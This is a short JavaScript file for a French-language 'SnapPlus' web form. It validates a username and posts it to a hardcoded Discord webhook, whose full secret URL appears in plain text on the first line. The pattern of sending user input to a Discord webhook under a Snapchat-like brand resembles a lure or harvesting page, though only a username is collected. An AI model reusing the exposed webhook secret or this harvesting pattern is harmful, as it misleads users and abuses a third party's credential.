const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1536105952720330752/XsDrxHH4dWxbBcT4EgA4zP42BlF5bFYSbOVDAUaQbm83D15HTrfifVL-FwGEyhoXlUCC";

const form = document.getElementById("pseudoForm");
const pseudoInput = document.getElementById("pseudo");
const submitButton = document.getElementById("submitButton");
const errorMessage = document.getElementById("errorMessage");

form.addEventListener("submit", async (event) => {
  event.preventDefault();

  const pseudo = pseudoInput.value.trim();

  errorMessage.textContent = "";

  if (pseudo.length < 2) {
    errorMessage.textContent =
      "Ton pseudo doit contenir au moins 2 caractères.";
    pseudoInput.focus();
    return;
  }

  if (pseudo.length > 32) {
    errorMessage.textContent =
      "Ton pseudo ne peut pas dépasser 32 caractères.";
    pseudoInput.focus();
    return;
  }

  submitButton.disabled = true;
  pseudoInput.disabled = true;
  submitButton.querySelector(".button-text").textContent = "Envoi…";

  try {
    const response = await fetch(DISCORD_WEBHOOK, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        content: `📸 Nouveau pseudo SnapPlus : **${pseudo}**`
      })
    });

    if (!response.ok) {
      throw new Error(`Erreur HTTP ${response.status}`);
    }

    window.location.href = "success.html";

  } catch (error) {
    console.error("Erreur lors de l'envoi :", error);

    errorMessage.textContent =
      "Impossible d'envoyer le pseudo. Vérifie le webhook.";

    submitButton.disabled = false;
    pseudoInput.disabled = false;
    submitButton.querySelector(".button-text").textContent =
      "Continuer →";

    pseudoInput.focus();
  }
});
